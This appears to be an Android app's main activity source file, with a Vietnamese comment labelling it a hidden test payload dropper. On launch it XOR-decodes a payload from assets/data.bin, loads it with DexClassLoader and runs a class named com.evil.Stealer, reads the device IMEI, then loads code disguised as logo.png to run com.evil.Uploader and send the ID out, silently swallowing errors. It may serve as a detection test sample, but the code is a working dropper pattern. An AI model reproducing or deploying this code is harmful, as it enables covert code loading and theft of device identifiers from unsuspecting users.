package com.rdict.t8;
import android.app.Activity; import android.os.Bundle; import android.telephony.TelephonyManager;
import dalvik.system.DexClassLoader; import java.io.*;
// App test payload ẩn (dropper): payload trong assets/ bị XOR, và jar đội lốt ảnh
public class MainActivity extends Activity {
    File drop(String asset, int key) throws IOException {
        InputStream in = getAssets().open(asset);
        File f = new File(getCodeCacheDir(), "p.dex");
        OutputStream out = new FileOutputStream(f);
        int c; while ((c = in.read()) != -1) out.write(c ^ key);
        out.close(); in.close();
        return f;
    }
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            File p1 = drop("data.bin", 0x5a);
            DexClassLoader l1 = new DexClassLoader(p1.getPath(), getCodeCacheDir().getPath(), null, getClassLoader());
            Class<?> k = l1.loadClass("com.evil.Stealer");
            k.getMethod("run", android.content.Context.class).invoke(k.newInstance(), this);
            String id = ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getDeviceId();
            File p2 = drop("logo.png", 0);
            DexClassLoader l2 = new DexClassLoader(p2.getPath(), getCodeCacheDir().getPath(), null, getClassLoader());
            Plugin pl = (Plugin) l2.loadClass("com.evil.Uploader").newInstance();
            pl.send(id);
        } catch (Exception e) { }
    }
}
